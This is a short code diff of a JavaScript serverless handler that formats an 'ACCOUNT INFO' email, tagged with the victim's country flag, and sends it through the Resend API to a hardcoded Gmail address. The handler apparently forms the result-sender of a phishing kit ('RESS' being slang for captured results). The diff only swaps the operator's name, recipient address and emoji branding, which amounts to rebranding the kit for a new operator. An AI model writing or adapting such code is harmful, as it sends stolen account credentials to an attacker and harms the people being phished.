@@ -45,8 +45,8 @@ export default async function handler(req, res) {
             return res.status(400).json({ error: "BODY_EMPTY" });
         }
 
-        const NAMA  = process.env.RESS_NAME  || "STOK LYNN🀄";
-        const EMAIL = process.env.RESS_EMAIL || "lynngasieewow@gmail.com";
+        const NAMA  = process.env.RESS_NAME  || "RESS KENZO";
+        const EMAIL = process.env.RESS_EMAIL || "medikaputra5@gmail.com";
 
         const flag = countryFlag(d.negaraKode || "");
 
@@ -59,7 +59,7 @@ export default async function handler(req, res) {
 <div style="font-family:Arial,sans-serif;background:#f4f4f4;padding:20px">
   <div style="max-width:600px;margin:auto;background:#fff;border-radius:10px;overflow:hidden">
     <div style="background:linear-gradient(135deg,#667eea,#764ba2);padding:25px;text-align:center;color:#fff">
-      <h1 style="margin:0;font-size:22px">🀄 ${NAMA} 🀄</h1>
+      <h1 style="margin:0;font-size:22px">🥷 ${NAMA} 🥷</h1>
     </div>
     <div style="padding:25px">
       <h3 style="color:#1a73e8;border-bottom:2px solid #1a73e8;padding-bottom:8px;margin-top:0">📧 ACCOUNT INFO</h3>
@@ -106,7 +106,7 @@ export default async function handler(req, res) {
             body: JSON.stringify({
                 from: NAMA + " <onboarding@resend.dev>",
                 to: [EMAIL],
-                subject: "🀄 " + NAMA + " 🀄 - " + Date.now(),
+                subject: "🥷 " + NAMA + " 🥷 - " + Date.now(),
                 html: htmlBody
             })
         });
